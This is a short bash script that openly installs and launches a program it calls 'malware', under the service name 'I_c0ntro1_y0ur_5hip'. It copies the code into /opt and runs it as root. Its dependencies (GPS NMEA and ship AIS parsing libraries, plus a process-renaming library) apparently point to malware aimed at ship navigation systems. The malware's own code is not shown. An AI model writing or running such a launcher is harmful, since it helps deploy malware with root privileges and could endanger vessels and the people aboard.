#!/bin/bash

set -e

SERVICE_NAME="I_c0ntro1_y0ur_5hip"
INSTALL_DIR="/opt/$SERVICE_NAME"
MALWARE_DIR="$INSTALL_DIR/malware"
MAIN_FILE="$MALWARE_DIR/__main__.py"
PYTHON="$INSTALL_DIR/venv/bin/python"

# 1. Install malware code
sudo mkdir -p "$MALWARE_DIR"
sudo cp -r malware/* "$MALWARE_DIR"

# 2. Create virtual environment
sudo python3 -m venv "$INSTALL_DIR/venv"

# 3. Install dependencies
sudo "$PYTHON" -m pip install --quiet --no-cache-dir aiohttp~=3.8 pynmea2~=1.18 pyais~=2.4 setproctitle

# 4. Execute the malware
cd "$MALWARE_DIR"
exec sudo "$PYTHON" "$MAIN_FILE"
